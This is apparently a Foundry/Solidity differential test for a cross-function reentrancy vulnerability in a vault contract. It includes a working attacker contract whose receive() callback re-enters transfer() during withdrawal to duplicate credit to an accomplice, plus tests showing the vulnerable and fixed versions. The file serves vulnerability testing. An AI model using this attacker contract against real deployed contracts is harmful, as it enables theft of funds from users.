// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {CrossFunctionVault} from "../src/CrossFunctionVault.sol";
import {CrossFunctionVaultFixed} from "../src/CrossFunctionVaultFixed.sol";

/*
 * CrossFunctionVault differential fixture test.
 *
 * The dataset port has NO payable/deposit entry point, so state is seeded from
 * the test with cheatcodes:
 *   - vm.store(vault, keccak256(abi.encode(account, uint256(0))), credit)
 *     writes the private `userBalances` mapping (slot 0) directly.
 *   - vm.deal(vault, credit) gives the vault the ETH it must pay out.
 *
 * Attack (cross-function reentrancy): the attacker contract calls
 * withdrawBalance(). withdrawBalance() pays the ETH out via an external call
 * BEFORE zeroing the balance, so during the callback the attacker still owns its
 * full credit. It re-enters transfer() and moves that credit to an accomplice
 * address. Result: the attacker keeps the ETH AND a fresh credit claim exists at
 * the accomplice -- the credit was duplicated instead of destroyed.
 */

/// Attacker contract for the cross-function reentrancy.
contract CrossFunctionVaultAttacker {
    address public vault;
    address public accomplice;
    bool private entered;

    constructor(address _vault, address _accomplice) {
        vault = _vault;
        accomplice = _accomplice;
    }

    function attack() external {
        (bool ok, ) = vault.call(abi.encodeWithSignature("withdrawBalance()"));
        require(ok, "withdrawBalance failed");
    }

    receive() external payable {
        if (!entered) {
            entered = true;
            // withdrawBalance() has NOT yet zeroed our balance: move the full
            // credit to the accomplice before it is wiped.
            (bool ok, ) = vault.call(abi.encodeWithSignature("transfer(address,uint256)", accomplice, msg.value));
            ok; // best effort; a no-op in the fixed variant
        }
    }
}

contract CrossFunctionVaultFixtureTest is Test {
    uint256 internal constant SEED = 10 ether;
    address internal constant ACCOMPLICE = address(0xACC0);

    // userBalances is the first (slot 0) mapping.
    function _slot(address key) internal pure returns (bytes32) {
        return keccak256(abi.encode(key, uint256(0)));
    }

    function _credit(address vault, address who) internal view returns (uint256) {
        return uint256(vm.load(vault, _slot(who)));
    }

    function test_fixtureReproduces() public {
        CrossFunctionVault vault = new CrossFunctionVault();
        CrossFunctionVaultAttacker attacker = new CrossFunctionVaultAttacker(address(vault), ACCOMPLICE);

        // Seed state from the test (port has no deposit function).
        vm.store(address(vault), _slot(address(attacker)), bytes32(SEED));
        vm.deal(address(vault), SEED);

        assertEq(_credit(address(vault), address(attacker)), SEED, "attacker seeded with credit");
        assertEq(address(vault).balance, SEED, "vault funded");

        attacker.attack();

        // The attacker was paid the ETH ...
        assertEq(address(vault).balance, 0, "vault drained");
        assertEq(address(attacker).balance, SEED, "attacker received the ETH");
        // ... AND the credit survived at the accomplice (duplicated).
        assertEq(_credit(address(vault), ACCOMPLICE), SEED, "REPRODUCED: credit duplicated to accomplice");
        assertEq(_credit(address(vault), address(attacker)), 0, "attacker's own credit zeroed");

        // Control: an honest EOA withdrawal is unaffected (no callback).
        address honest = address(0xB0B);
        vm.store(address(vault), _slot(honest), bytes32(uint256(5 ether)));
        vm.deal(address(vault), 5 ether);
        vm.prank(honest);
        vault.withdrawBalance();
        assertEq(_credit(address(vault), honest), 0, "honest credit zeroed");
        assertEq(honest.balance, 5 ether, "honest paid out");
    }

    function test_fixtureDoesNotReproduce() public {
        CrossFunctionVaultFixed vault = new CrossFunctionVaultFixed();
        // Same attacker shape, bound to the fixed vault.
        CrossFunctionVaultAttacker attacker = new CrossFunctionVaultAttacker(address(vault), ACCOMPLICE);

        vm.store(address(vault), _slot(address(attacker)), bytes32(SEED));
        vm.deal(address(vault), SEED);

        attacker.attack();

        // The legitimate withdrawal still happens ...
        assertEq(address(vault).balance, 0, "vault paid out");
        assertEq(address(attacker).balance, SEED, "attacker received the ETH");
        // ... but the re-entrant transfer() is a no-op: the credit is NOT duplicated.
        assertEq(_credit(address(vault), ACCOMPLICE), 0, "no credit duplicated at accomplice");
        assertEq(_credit(address(vault), address(attacker)), 0, "attacker's own credit zeroed");

        // Control: an honest EOA withdrawal is unaffected.
        address honest = address(0xB0B);
        vm.store(address(vault), _slot(honest), bytes32(uint256(5 ether)));
        vm.deal(address(vault), 5 ether);
        vm.prank(honest);
        vault.withdrawBalance();
        assertEq(_credit(address(vault), honest), 0, "honest credit zeroed");
        assertEq(honest.balance, 5 ether, "honest paid out");
    }
}
